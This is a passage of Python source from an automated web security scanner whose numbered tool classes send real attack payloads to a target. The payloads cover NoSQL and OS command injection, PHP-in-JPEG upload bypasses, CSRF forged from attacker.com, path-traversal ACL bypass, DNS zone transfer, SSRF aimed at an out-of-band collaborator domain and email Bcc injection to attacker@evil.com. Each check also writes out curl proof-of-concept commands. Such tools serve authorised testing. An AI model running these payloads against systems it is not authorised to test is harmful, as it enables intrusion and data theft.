        params = list(set(profile.parameters[:5] + ["username","email","password","id","search"]))
        confirmed = []
        for param in params[:8]:
            # JSON body injection
            for payload in payloads_json:
                try:
                    body_data = json.dumps({param: json.loads(payload)}).encode()
                except Exception:
                    continue
                code, body, _ = _fetch(base, cfg.user_agent, cfg.timeout,
                    method="POST", data=body_data,
                    headers_extra={"Content-Type":"application/json"})
                if code == 200 and len(body) > 20:
                    baseline_code, baseline_body, _ = _fetch(base, cfg.user_agent, cfg.timeout,
                        method="POST", data=json.dumps({param: "invalid_xyz_123"}).encode(),
                        headers_extra={"Content-Type":"application/json"})
                    if len(body) != len(baseline_body) and abs(len(body)-len(baseline_body)) > 30:
                        high(f"  NoSQLi: param '{param}' payload '{payload}' changed response!")
                        confirmed.append({"param":param,"payload":payload})
            # URL param injection
            for suffix in payloads_url:
                test_url = f"{base}?{param}{suffix}"
                code, body, _ = _fetch(test_url, cfg.user_agent, cfg.timeout)
                if code == 200:
                    baseline_code, baseline_body, _ = _fetch(f"{base}?{param}=invalid_xyz", cfg.user_agent, cfg.timeout)
                    if len(body) != len(baseline_body) and abs(len(body)-len(baseline_body)) > 30:
                        warn(f"  NoSQLi URL: {test_url}")
                        confirmed.append({"param":param,"payload":suffix})
        if confirmed:
            profile.findings.append(Finding(
                id="F-NOSQL-001", title="NoSQL Injection (MongoDB Operators)",
                severity="CRITICAL", cwe="CWE-943", cvss=9.4,
                description=f"NoSQL operator injection in: {[c['param'] for c in confirmed]}",
                evidence="\n".join(f"{c['param']}: {c['payload']}" for c in confirmed[:5]),
                reproduction=f"curl -sk -X POST '{base}' -H 'Content-Type: application/json' -d '{{\"username\":{{\"$gt\":\"\"}},\"password\":{{\"$gt\":\"\"}}}}'",
                poc_curl=f"curl -sk -X POST '{base}' -H 'Content-Type: application/json' -d '{{\"username\":{{\"$gt\":\"\"}},\"password\":{{\"$gt\":\"\"}}}}'",
                category="NoSQL Injection",
                remediation="Sanitize inputs. Use schema validation. Avoid $where. Use query builders."
            ))
        return profile

# ── TOOL 38: COMMAND INJECTION  (SKILL-48) ─────────────────
class CommandInjectionScanner:
    """Safe blind detection via timing (sleep 0 = no actual delay risk)."""
    CMD_PAYLOADS = [
        (";echo CMDINJTEST",  "CMDINJTEST"),
        ("&&echo CMDINJTEST", "CMDINJTEST"),
        ("|echo CMDINJTEST",  "CMDINJTEST"),
        ("`echo CMDINJTEST`", "CMDINJTEST"),
        ("$(echo CMDINJTEST)","CMDINJTEST"),
        (";id",               "uid="),
        ("&&id",              "uid="),
        ("|id",               "uid="),
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("CMDI-38: Command injection (echo/id-based reflection detection)")
        base = profile.url.rstrip("/")
        params = list(set(profile.parameters[:8] + ["cmd","exec","run","command","ping","host","ip","query"]))
        confirmed = []
        for param in params[:10]:
            for payload, indicator in self.CMD_PAYLOADS:
                url = f"{base}?{param}={urllib.parse.quote(payload)}"
                code, body, _ = _fetch(url, cfg.user_agent, cfg.timeout)
                if indicator in body:
                    high(f"  CMDI CONFIRMED: param '{param}' payload '{payload}' → '{indicator}' in response!")
                    confirmed.append({"param":param,"payload":payload,"url":url,"indicator":indicator})
                    break
                # POST
                pc, pb, _ = _fetch(base, cfg.user_agent, cfg.timeout,
                    method="POST", data=urllib.parse.urlencode({param: payload}).encode())
                if indicator in pb:
                    high(f"  CMDI POST: '{param}' → '{indicator}'")
                    confirmed.append({"param":param,"payload":payload,"url":base,"indicator":indicator})
                    break
        if confirmed:
            profile.findings.append(Finding(
                id="F-CMDI-001", title="OS Command Injection",
                severity="CRITICAL", cwe="CWE-78", cvss=10.0,
                description=f"Command injection confirmed in params: {[c['param'] for c in confirmed]}",
                evidence="\n".join(f"{c['param']}: {c['payload']} → {c['indicator']}" for c in confirmed),
                reproduction="\n".join(f"curl -sk '{c['url']}'" for c in confirmed[:2]),
                poc_curl=f"curl -sk '{confirmed[0]['url']}'",
                category="Command Injection",
                remediation="Never pass user input to OS commands. Use allow-list validation. Use subprocess with args list."
            ))
        return profile

# ── TOOL 39: FILE UPLOAD SECURITY  (SKILL-49) ──────────────
class FileUploadTester:
    MALICIOUS_EXTENSIONS = [".php",".php5",".phtml",".phar",".asp",".aspx",".jsp",".jspx",".shtml"]
    POLYGLOT_JPEG_PHP = b'\xff\xd8\xff\xe0' + b'<?php echo "UPLOADTEST"; ?>'

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("UPLOAD-39: File upload security (extension bypass, content-type confusion)")
        _, html_body, _ = _fetch(profile.url, cfg.user_agent, cfg.timeout)
        # Find file upload forms
        upload_inputs = re.findall(r'<input[^>]*type=["\']file["\'][^>]*>', html_body, re.I)
        upload_forms  = re.findall(r'<form[^>]*(?:enctype=["\']multipart/form-data["\'])[^>]*action=["\']([^"\']+)["\']',
                                   html_body, re.I)
        if not upload_inputs and not upload_forms:
            # Check API paths
            for path in ["/api/upload","/upload","/api/file","/api/files","/api/media","/api/avatar","/api/attachment"]:
                code, body, hdrs = _fetch(profile.url.rstrip("/")+path, cfg.user_agent, cfg.timeout,
                                          method="POST",
                                          data=b'--boundary\r\nContent-Disposition: form-data; name="file"; filename="test.txt"\r\nContent-Type: text/plain\r\n\r\ntest\r\n--boundary--',
                                          headers_extra={"Content-Type":"multipart/form-data; boundary=boundary"})
                if code in [200,201,400,413,415,422]:
                    warn(f"  Upload endpoint: {path} [{code}]")
                    upload_forms.append(path)
            if not upload_forms:
                info("  No file upload endpoints found"); return profile

        upload_findings = []
        for action in (upload_forms[:3] or [profile.url]):
            url = action if action.startswith("http") else profile.url.rstrip("/")+action
            # Test 1: PHP disguised as image (polyglot)
            boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
            for ext in [".php.jpg",".php%00.jpg",".phtml",".php5"]:
                body_mp = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; "
                           f"filename=\"test{ext}\"\r\nContent-Type: image/jpeg\r\n\r\n").encode()
                body_mp += self.POLYGLOT_JPEG_PHP + f"\r\n--{boundary}--\r\n".encode()
                code, resp, hdrs = _fetch(url, cfg.user_agent, cfg.timeout,
                    method="POST", data=body_mp,
                    headers_extra={"Content-Type": f"multipart/form-data; boundary={boundary}"})
                if code in [200,201]:
                    # Check if file URL returned
                    file_url_match = re.search(r'https?://[^\s"\'<>]+' + re.escape(ext.split("%")[0]), resp)
                    if file_url_match or "success" in resp.lower() or "url" in resp.lower():
                        high(f"  FILE UPLOAD BYPASS: ext '{ext}' accepted at {url}")
                        upload_findings.append({"ext":ext,"url":url})
        if upload_findings:
            profile.findings.append(Finding(
                id="F-UPLOAD-001", title="File Upload Security Bypass",
                severity="CRITICAL", cwe="CWE-434", cvss=9.8,
                description=f"Malicious file extensions accepted: {[u['ext'] for u in upload_findings]}",
                evidence="\n".join(f"{u['ext']} → {u['url']}" for u in upload_findings),
                reproduction=f"curl -sk -X POST '{upload_findings[0]['url']}' -F 'file=@shell.php;filename=shell.php.jpg;type=image/jpeg'",
                poc_curl=f"curl -sk -X POST '{upload_findings[0]['url']}' -F 'file=@shell.php;filename=shell.php.jpg;type=image/jpeg'",
                category="File Upload",
                remediation="Validate file content by magic bytes, not extension. Store outside webroot. Use a CDN with execution disabled."
            ))
        else:
            info(f"  Upload endpoints found but no obvious bypass detected (manual test recommended)")
        return profile

# ── TOOL 40: CSRF BYPASS DETECTOR  (SKILL-50) ──────────────
class CSRFDetector:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("CSRF-40: CSRF token bypass detection")
        base = profile.url.rstrip("/")
        _, html_body, _ = _fetch(profile.url, cfg.user_agent, cfg.timeout)
        forms = re.findall(
            r'<form[^>]*method=["\']post["\'][^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>',
            html_body, re.I | re.S)
        issues = []
        for action, form_html in forms[:5]:
            action_url = action if action.startswith("http") else base + action
            has_csrf = bool(re.search(r'name=["\'](?:csrf|_token|authenticity_token|__RequestVerificationToken)["\']', form_html, re.I))
            has_samesite = any(c.get("issues") and "missing SameSite" not in str(c["issues"]) for c in profile.cookie_results)
            if not has_csrf:
                warn(f"  CSRF: POST form missing token — {action_url}")
                issues.append({"action": action_url, "issue": "missing_csrf_token"})
            else:
                # Try sending without token
                inputs = re.findall(r'name=["\']([^"\']+)["\'].*?value=["\']([^"\']*)["\']', form_html, re.I)
                data = {k: v for k, v in inputs if "csrf" not in k.lower() and "token" not in k.lower()}
                code, body, _ = _fetch(action_url, cfg.user_agent, cfg.timeout,
                    method="POST", data=urllib.parse.urlencode(data).encode(),
                    headers_extra={"Content-Type":"application/x-www-form-urlencoded",
                                   "Origin":"https://attacker.com", "Referer":"https://attacker.com/"})
                if code in [200, 201, 302]:
                    warn(f"  CSRF: form action may accept request without valid CSRF token!")
                    issues.append({"action": action_url, "issue": "token_not_validated"})
        if issues:
            profile.findings.append(Finding(
                id="F-CSRF-001", title="CSRF Protection Bypass",
                severity="HIGH", cwe="CWE-352", cvss=8.1,
                description=f"CSRF issues on {len(issues)} form(s).",
                evidence="\n".join(f"{i['action']}: {i['issue']}" for i in issues),
                reproduction="# Craft HTML form pointing to action URL and auto-submit from attacker.com",
                poc_curl=f"curl -sk -X POST '{issues[0]['action']}' -H 'Origin: https://attacker.com' -d 'param=value'",
                category="CSRF",
                remediation="Use SameSite=Strict cookies. Validate CSRF tokens server-side. Use double-submit cookie pattern."
            ))
        return profile

# ── TOOL 41: CLICKJACKING TESTER  (SKILL-51) ───────────────
class ClickjackingTester:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("CJACK-41: Clickjacking via X-Frame-Options + CSP frame-ancestors")
        _, _, hdrs = _fetch(profile.url, cfg.user_agent, cfg.timeout)
        xfo = hdrs.get("x-frame-options","").upper()
        csp = hdrs.get("content-security-policy","").lower()
        has_frame_ancestors = "frame-ancestors" in csp
        has_xfo = xfo in ["DENY","SAMEORIGIN"]
        if not has_xfo and not has_frame_ancestors:
            high(f"  CLICKJACKING: No X-Frame-Options or CSP frame-ancestors — page embeddable!")
            profile.findings.append(Finding(
                id="F-CJ-001", title="Clickjacking Vulnerability",
                severity="MEDIUM", cwe="CWE-1021", cvss=5.4,
                description="Page can be embedded in an iframe — clickjacking possible.",
                evidence=f"X-Frame-Options: '{xfo}' | CSP frame-ancestors: {has_frame_ancestors}",
                reproduction=(
                    "<html><body>"
                    f"<iframe src='{profile.url}' width='800' height='600'></iframe>"
                    "</body></html>"
                ),
                poc_curl=f"curl -sI '{profile.url}' | grep -i 'x-frame\\|frame-ancestors'",
                category="Clickjacking",
                remediation="Set X-Frame-Options: DENY or CSP frame-ancestors 'self'."
            ))
        elif xfo == "SAMEORIGIN" and not has_frame_ancestors:
            warn(f"  CLICKJACKING: X-Frame-Options=SAMEORIGIN (CSP preferred, SAMEORIGIN acceptable)")
        else:
            ok(f"  Clickjacking protected: XFO={xfo} | frame-ancestors={has_frame_ancestors}")
        return profile

# ── TOOL 42: HTTP METHOD TAMPERING  (SKILL-52) ─────────────
class HTTPMethodTampering:
    INTERESTING = ["TRACE","TRACK","PUT","DELETE","PATCH","OPTIONS","CONNECT","DEBUG","MOVE","COPY"]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("METHOD-42: HTTP method tampering + TRACE/WebDAV detection")
        vulns = []
        for method in self.INTERESTING:
            code, body, hdrs = _fetch(profile.url, cfg.user_agent, cfg.timeout, method=method)
            allow = hdrs.get("allow","")
            if method == "TRACE" and (code == 200 or "TRACE" in body.upper()):
                high(f"  TRACE ENABLED — XST (Cross-Site Tracing) risk!")
                vulns.append({"method":"TRACE","code":code,"risk":"XST"})
            elif method == "PUT" and code in [200,201,204]:
                high(f"  PUT METHOD ALLOWED: {code} — arbitrary file write possible!")
                vulns.append({"method":"PUT","code":code,"risk":"file_write"})
            elif method == "DELETE" and code in [200,204]:
                high(f"  DELETE METHOD ALLOWED: {code}")
                vulns.append({"method":"DELETE","code":code,"risk":"file_delete"})
            elif method == "OPTIONS" and allow:
                ok(f"  OPTIONS: Allow: {allow}")
                if re.search(r'\b(PUT|DELETE|TRACE|CONNECT)\b', allow):
                    warn(f"  Dangerous methods in Allow header: {allow}")
                    vulns.append({"method":"OPTIONS","code":code,"risk":f"dangerous_allow:{allow}"})
            # X-HTTP-Method-Override tunnel
            if method in ["DELETE","PUT"]:
                code2, body2, _ = _fetch(profile.url, cfg.user_agent, cfg.timeout,
                    method="POST",
                    headers_extra={"X-HTTP-Method-Override": method, "X-Method-Override": method})
                if code2 in [200,201,204]:
                    warn(f"  METHOD OVERRIDE: POST+X-HTTP-Method-Override:{method} → {code2}")
                    vulns.append({"method":f"POST→{method}","code":code2,"risk":"method_override"})
        if vulns:
            dangerous = [v for v in vulns if v["risk"] in ["XST","file_write","file_delete"]]
            profile.findings.append(Finding(
                id="F-METHOD-001", title="Dangerous HTTP Methods Enabled",
                severity="HIGH" if dangerous else "MEDIUM",
                cwe="CWE-749", cvss=7.5 if dangerous else 5.3,
                description=f"Dangerous HTTP methods: {[v['method'] for v in vulns]}",
                evidence="\n".join(f"{v['method']}: HTTP {v['code']} ({v['risk']})" for v in vulns),
                reproduction="\n".join(f"curl -sk -X {v['method']} '{profile.url}'" for v in vulns[:3]),
                poc_curl=f"curl -sk -X TRACE '{profile.url}'",
                category="HTTP Methods",
                remediation="Disable unused HTTP methods at web server level. Block TRACE/TRACK globally."
            ))
        return profile

# ── TOOL 43: ACCOUNT ENUMERATION (TIMING)  (SKILL-53) ──────
class AccountEnumerationTiming:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("ENUM-43: Account enumeration via login/register response timing")
        base = profile.url.rstrip("/")
        login_paths = ["/api/login","/login","/api/auth/login","/auth/login","/api/v1/auth"]
        register_paths = ["/api/register","/register","/api/signup","/signup","/api/users"]
        for path in login_paths[:3]:
            url = base + path
            # Test with likely-existing email vs random
            times = {"known":[], "unknown":[]}
            for email, key in [("admin@example.com","known"),("nonexistent_xyz_123@notreal.invalid","unknown")]:
                for _ in range(3):
                    t0 = time.time()
                    _fetch(url, cfg.user_agent, 5, method="POST",
                           data=json.dumps({"email":email,"password":"wrongpassword"}).encode(),
                           headers_extra={"Content-Type":"application/json"})
                    times[key].append(time.time()-t0)
                    time.sleep(0.1)
            avg_known   = sum(times["known"])   / len(times["known"])
            avg_unknown = sum(times["unknown"]) / len(times["unknown"])
            diff = abs(avg_known - avg_unknown)
            if diff > 0.1:
                warn(f"  TIMING DIFF on {path}: known={avg_known:.3f}s unknown={avg_unknown:.3f}s (diff={diff:.3f}s)")
                if diff > 0.3:
                    profile.findings.append(Finding(
                        id=f"F-ENUM-{len(profile.findings):03d}",
                        title="Account Enumeration via Response Timing",
                        severity="MEDIUM", cwe="CWE-203", cvss=5.3,
                        description=f"Login at {path} leaks user existence via timing: {diff:.3f}s difference.",
                        evidence=f"Known: {avg_known:.3f}s | Unknown: {avg_unknown:.3f}s | Diff: {diff:.3f}s",
                        reproduction=f"# Time 10 requests with admin@target.com vs random@random.invalid at {url}",
                        poc_curl=f"time curl -sk -X POST '{url}' -H 'Content-Type: application/json' -d '{{\"email\":\"admin@{profile.host}\",\"password\":\"x\"}}'",
                        category="Account Enumeration",
                        remediation="Use constant-time comparison. Return identical responses for valid/invalid users."
                    ))
        return profile

# ── TOOL 44: PATH-BASED ACL BYPASS  (SKILL-54) ─────────────
class PathACLBypass:
    TRAVERSALS = [
        "/admin/../user", "/admin/%2e%2e/user", "/admin/./user",
        "/admin%2fadmin", "/ADMIN", "/Admin",
        "/api/admin/../public", "/api/v1/admin%2f..%2fpublic",
        "//admin", "/./admin", "/%61dmin",  # URL encoding of 'a'
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("ACLBYP-44: Path-based ACL bypass (traversal, case, encoding)")
        base = profile.url.rstrip("/")
        found = []
        # Baseline: what does /admin return normally?
        admin_code, _, _ = _fetch(base+"/admin", cfg.user_agent, cfg.timeout)
        if admin_code not in [401,403]:
            info(f"  /admin returns {admin_code} — no baseline restriction to bypass")
            return profile
        for traversal in self.TRAVERSALS:
            code, body, _ = _fetch(base+traversal, cfg.user_agent, cfg.timeout)
            if code == 200:
                high(f"  ACL BYPASS: {traversal} → HTTP {code} (baseline /admin = {admin_code})")
                found.append({"path":traversal,"code":code})
        if found:
            profile.findings.append(Finding(
                id="F-ACL-001", title="Path-Based Access Control Bypass",
                severity="HIGH", cwe="CWE-22", cvss=8.6,
                description=f"ACL bypass via path manipulation: {[f['path'] for f in found]}",
                evidence=f"Baseline /admin: HTTP {admin_code}\n" + "\n".join(f"{f['path']}: HTTP {f['code']}" for f in found),
                reproduction="\n".join(f"curl -sk '{base+f['path']}'" for f in found[:3]),
                poc_curl=f"curl -sk '{base+found[0]['path']}'",
                category="Access Control",
                remediation="Normalize URL paths before authorization checks. Use path canonicalization."
            ))
        return profile

# ── TOOL 45: API VERSION DOWNGRADE  (SKILL-55) ─────────────
class APIVersionDowngrade:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("APIDOWN-45: API version downgrade privilege regression")
        base = profile.url.rstrip("/")
        vuln_paths = []
        # Find highest API version available
        versions = []
        for v in ["/api/v1","/api/v2","/api/v3","/v1","/v2","/v3"]:
            code, _, _ = _fetch(base+v, cfg.user_agent, cfg.timeout)
            if code in [200,401,403]: versions.append((v,code))
        if len(versions) < 2:
            info("  Only one API version found — no downgrade test possible")
            return profile
        # Compare response structure between versions on same endpoints
        for endpoint in ["/users","/user","/profile","/account","/admin"]:
            codes = {}
            for v, _ in versions:
                url = base+v+endpoint
                code, body, _ = _fetch(url, cfg.user_agent, cfg.timeout)
                codes[v] = (code, len(body))
            code_set = set(c for c,_ in codes.values())
            if len(code_set) > 1:
                sorted_codes = sorted(codes.items(), key=lambda x: x[0])
                warn(f"  VERSION DIFF on {endpoint}: " + " | ".join(f"{v}: HTTP {c}" for v,(c,s) in sorted_codes))
                # If newer version is restricted (401/403) but older returns 200
                v_codes = {v:c for v,(c,s) in codes.items()}
                newer = [v for v in ["/api/v3","/v3","/api/v2","/v2"] if v in v_codes and v_codes[v] in [401,403]]
                older = [v for v in ["/api/v1","/v1"] if v in v_codes and v_codes[v] == 200]
                if newer and older:
                    high(f"  API DOWNGRADE: {older[0]+endpoint} returns 200 but {newer[0]+endpoint} is {v_codes[newer[0]]}")
                    vuln_paths.append({"endpoint":endpoint,"old":older[0],"new":newer[0],"diff":v_codes})
        if vuln_paths:
            profile.findings.append(Finding(
                id="F-APIDOWN-001", title="API Version Downgrade — Security Regression",
                severity="HIGH", cwe="CWE-1059", cvss=7.5,
                description=f"Older API versions expose endpoints restricted in newer versions.",
                evidence="\n".join(f"{v['endpoint']}: {v['old']}=200 vs {v['new']}=403" for v in vuln_paths),
                reproduction="\n".join(f"curl -sk '{base+v['old']+v['endpoint']}'" for v in vuln_paths[:2]),
                poc_curl=f"curl -sk '{base+vuln_paths[0]['old']+vuln_paths[0]['endpoint']}'",
                category="API Security",
                remediation="Apply identical authorization checks across all API versions. Deprecate and remove old versions."
            ))
        return profile

# ── TOOL 46: TLS MISCONFIGURATION SCANNER  (SKILL-56) ──────
class TLSMisconfigScanner:
    WEAK_CIPHERS = ["RC4","DES","3DES","EXPORT","NULL","ANON","aNULL","eNULL","SEED","MD5"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("TLS-46: TLS version + weak cipher + old protocol detection")
        host = profile.host; issues = []
        # Check TLS 1.0 and 1.1 support
        for proto, ver_const in [("TLSv1.0", ssl.TLSVersion.TLSv1), ("TLSv1.1", ssl.TLSVersion.TLSv1_1)]:
            try:
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                ctx.minimum_version = ver_const; ctx.maximum_version = ver_const
                with socket.create_connection((host,443),timeout=6) as s:
                    with ctx.wrap_socket(s, server_hostname=host) as ss:
                        high(f"  TLS WEAK PROTOCOL: {proto} accepted!")
                        issues.append(f"{proto} supported")
            except (ssl.SSLError, AttributeError, OSError):
                ok(f"  {proto}: rejected (good)")
        # Check current cipher suite
        cipher = profile.tls_cipher.upper()
        for weak in self.WEAK_CIPHERS:
            if weak in cipher:
                high(f"  WEAK CIPHER: {cipher} contains {weak}")
                issues.append(f"weak_cipher:{cipher}")
        # Check TLS version
        tls = profile.tls_version
        if tls in ["TLSv1","TLSv1.1"]:
            high(f"  DEPRECATED TLS: {tls}")
            issues.append(f"deprecated_tls:{tls}")
        elif tls in ["TLSv1.2"]:
            warn(f"  TLS 1.2 (prefer 1.3)")
        elif tls == "TLSv1.3":
            ok(f"  TLS 1.3 — current best practice")
        if issues:
            profile.findings.append(Finding(
                id="F-TLS-001", title="TLS Misconfiguration",
                severity="HIGH" if any("TLSv1.0" in i or "TLSv1.1" in i for i in issues) else "MEDIUM",
                cwe="CWE-326", cvss=7.4,
                description=f"TLS issues: {issues}",
                evidence=f"Issues: {issues}\nCurrent TLS: {tls} | Cipher: {cipher}",
                reproduction=f"openssl s_client -connect {host}:443 -tls1",
                poc_curl=f"curl -sk --tls-max 1.1 '{profile.url}'",
                category="TLS",
                remediation="Disable TLS 1.0/1.1. Configure only TLS 1.2+ with strong ciphers (AES-GCM, ChaCha20)."
            ))
        return profile

# ── TOOL 47: DNS ZONE TRANSFER  (SKILL-57) ─────────────────
class DNSZoneTransfer:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("AXFR-47: DNS zone transfer (AXFR) attempt")
        apex = profile.apex
        import subprocess
        # Get NS records first
        ns_servers = []
        try:
            result = subprocess.run(["dig","+short","NS",apex], capture_output=True, text=True, timeout=8)
            ns_servers = [line.strip() for line in result.stdout.splitlines() if line.strip()]
        except Exception:
            # Fallback: try common NS patterns
            ns_servers = [f"ns1.{apex}", f"ns2.{apex}"]
        for ns in ns_servers[:3]:
            ns_clean = ns.rstrip(".")
            try:
                result = subprocess.run(
                    ["dig", "+noall", "+answer", f"@{ns_clean}", "AXFR", apex],
                    capture_output=True, text=True, timeout=10)
                output = result.stdout
                if output and len(output) > 100 and re.search(r'\s+IN\s+', output):
                    high(f"  ZONE TRANSFER ALLOWED via {ns_clean}!")
                    records = [l for l in output.splitlines() if l.strip() and not l.startswith(";")]
                    profile.findings.append(Finding(
                        id="F-AXFR-001", title="DNS Zone Transfer (AXFR) Allowed",
                        severity="HIGH", cwe="CWE-200", cvss=7.5,
                        description=f"DNS zone transfer allowed from {ns_clean} — full zone exposed.",
                        evidence="\n".join(records[:20]),
                        reproduction=f"dig @{ns_clean} AXFR {apex}",
                        poc_curl=f"dig @{ns_clean} AXFR {apex}",
                        category="DNS",
                        remediation="Restrict AXFR to authorized secondary DNS servers only."
                    ))
                else:
                    ok(f"  AXFR refused by {ns_clean} (good)")
            except Exception as e:
                info(f"  AXFR test failed for {ns_clean}: {e}")
        return profile

# ── TOOL 48: INSECURE DESERIALIZATION  (SKILL-58) ──────────
class DeserializationDetector:
    JAVA_MAGIC  = b'\xac\xed\x00\x05'
    PHP_PAT     = re.compile(r'O:\d+:"[^"]+":')
    PYTHON_PAT  = re.compile(r'(?:cos\n|cposix\n|cpickle\n)', re.S)
    JWT_NONE_PAT= re.compile(r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.\s*$')

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("DESER-48: Insecure deserialization detection")
        issues = []
        for src_url in [profile.url] + profile.js_files[:5]:
            _, body, _ = _fetch(src_url, cfg.user_agent, cfg.timeout)
            if not body: continue
            # PHP serialized objects
            if self.PHP_PAT.search(body):
                warn(f"  PHP serialized object pattern in {src_url}")
                issues.append({"type":"php_serialize","url":src_url})
            # Base64-encoded Java serialization magic
            for m in re.finditer(r'[A-Za-z0-9+/]{20,}={0,2}', body):
                try:
                    dec = base64.b64decode(m.group(0))
                    if dec.startswith(self.JAVA_MAGIC):
                        high(f"  JAVA SERIALIZED OBJECT (base64) in {src_url}")
                        issues.append({"type":"java_serialize","url":src_url,"b64":m.group(0)[:40]})
                except Exception: pass
            # ViewState (ASP.NET) — check if MAC validation disabled
            vs = re.search(r'id=["\']__VIEWSTATE["\'][^>]*value=["\']([^"\']+)["\']', body)
            if vs:
                vs_val = vs.group(1)
                try:
                    decoded = base64.b64decode(vs_val + "==")
                    # If no MAC suffix (16 bytes), MAC validation might be off
                    if len(decoded) < 20 or not decoded[-20:]:
                        warn("  ViewState without MAC — deserialization exploit possible")
                        issues.append({"type":"viewstate_no_mac","url":src_url})
                except Exception: pass
        if issues:
            profile.findings.append(Finding(
                id="F-DESER-001", title="Insecure Deserialization Indicators",
                severity="HIGH", cwe="CWE-502", cvss=8.1,
                description=f"Serialized objects found: {[i['type'] for i in issues]}",
                evidence="\n".join(f"{i['type']}: {i['url']}" for i in issues[:5]),
                reproduction="# Test with ysoserial (Java) or phpggc (PHP) gadget chains",
                poc_curl=f"# Manual: send crafted serialized payload to {profile.url}",
                category="Deserialization",
                remediation="Avoid deserializing untrusted data. Use HMAC to sign serialized state. Use JSON instead."
            ))
        return profile

# ── TOOL 49: BLIND SSRF OOB PAYLOAD GENERATOR  (SKILL-59) ──
class BlindSSRFGenerator:
    """Generates OOB SSRF payloads using DNS-based detection patterns."""
    SSRF_PARAMS = ["url","fetch","src","href","link","endpoint","webhook","image_url",
                   "img_url","proxy","resource","target","dest","redirect","callback","feed"]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("BLIND-SSRF-49: OOB SSRF payload generation for manual verification")
        base = profile.url.rstrip("/")
        # Generate interaction URL placeholders (for Burp Collaborator / interactsh)
        host = profile.host
        oob_domain = f"YOUR_OOB_DOMAIN.burpcollaborator.net"
        payloads_generated = []
        # Probe params from JS/Wayback
        for param in list(set(profile.ssrf_params + self.SSRF_PARAMS))[:10]:
            oob_url = f"http://{param}.{host}.{oob_domain}/"
            test_url = f"{base}?{param}={urllib.parse.quote(oob_url)}"
            payloads_generated.append({"param":param,"payload":oob_url,"test_url":test_url})
        # Also probe all discovered API endpoints
        for endpoint in profile.api_endpoints[:10]:
            ep_url = base + endpoint if endpoint.startswith("/") else endpoint
            for param in self.SSRF_PARAMS[:5]:
                full = f"{ep_url}?{param}=http://{param}.oob.{oob_domain}/"
                payloads_generated.append({"param":param,"payload":full,"test_url":full})
        if payloads_generated:
            poc_lines = "\n".join(f"curl -sk '{p['test_url']}'" for p in payloads_generated[:10])
            profile.findings.append(Finding(
                id="F-BSSRF-001", title="Blind SSRF Attack Surface — OOB Payloads Generated",
                severity="INFO", cwe="CWE-918", cvss=0.0,
                description=f"Generated {len(payloads_generated)} OOB SSRF payloads for manual verification.",
                evidence="\n".join(f"{p['param']}: {p['test_url'][:80]}" for p in payloads_generated[:10]),
                reproduction=f"# Replace {oob_domain} with your Burp Collaborator/interactsh domain:\n{poc_lines}",
                poc_curl=f"curl -sk '{payloads_generated[0]['test_url']}'",
                category="SSRF",
                remediation="Use Burp Collaborator or https://app.interactsh.com to detect DNS callbacks."
            ))
        return profile

# ── TOOL 50: EMAIL/SMTP HEADER INJECTION  (SKILL-60) ───────
class EmailHeaderInjection:
    INJECT_PAYLOADS = [
        "test@test.com\r\nBcc: attacker@evil.com",
        "test@test.com\nBcc: attacker@evil.com",
        "test%0aBcc:attacker@evil.com",
        "test%0d%0aBcc:attacker@evil.com",
        "test@test.com\r\nContent-Type: text/html\r\n<script>alert(1)</script>",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("EMAIL-50: SMTP header injection via contact/feedback forms")
        _, html_body, _ = _fetch(profile.url, cfg.user_agent, cfg.timeout)
        email_forms = re.findall(
            r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>',
            html_body, re.I | re.S)
        email_endpoints = ["/contact","/feedback","/support/new","/api/contact",
                           "/api/feedback","/help/new","/api/email","/subscribe"]
        confirmed = []
        for path in email_endpoints[:5]:
            url = profile.url.rstrip("/") + path
            code, body, _ = _fetch(url, cfg.user_agent, cfg.timeout,
                method="POST",
                data=urllib.parse.urlencode({
                    "email": self.INJECT_PAYLOADS[0],
                    "name": "Test", "message": "Test", "subject": "Test"
                }).encode(),
                headers_extra={"Content-Type":"application/x-www-form-urlencoded"})
            if code in [200,201,202] and re.search(r'sent|success|thank|received', body, re.I):
                high(f"  EMAIL INJECTION candidate at {path} — email accepted with CRLF payload!")
                confirmed.append({"path":path,"url":url})
        if confirmed:
            profile.findings.append(Finding(
                id="F-EMAIL-001", title="Email/SMTP Header Injection",
                severity="MEDIUM", cwe="CWE-93", cvss=5.3,
                description=f"Email header injection possible at {[c['path'] for c in confirmed]}",
                evidence="\n".join(f"{c['url']}: accepted CRLF in email field" for c in confirmed),
                reproduction="\n".join(
                    f"curl -sk -X POST '{c['url']}' -d 'email=test%40test.com%0aBcc%3Aattacker%40evil.com&message=test'"
                    for c in confirmed[:2]),
                poc_curl=f"curl -sk -X POST '{confirmed[0]['url']}' -d 'email=test%40test.com%0aBcc%3Aattacker%40evil.com&message=test'",
                category="Email Injection",
                remediation="Sanitize email fields. Reject CRLF characters. Use email sending libraries with strict validation."
            ))
        return profile

# ── TOOL 51: JSONP ENDPOINT DISCOVERY  (SKILL-61) ──────────
class JSONPDiscovery:
    """JSONP can bypass CSP if the domain is whitelisted."""
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("JSONP-51: JSONP endpoint discovery (CSP bypass vector)")
        base = profile.url.rstrip("/")
        found = []
        jsonp_params = ["callback","cb","jsonp","json_callback","call","fn","func","handler","wrapper"]
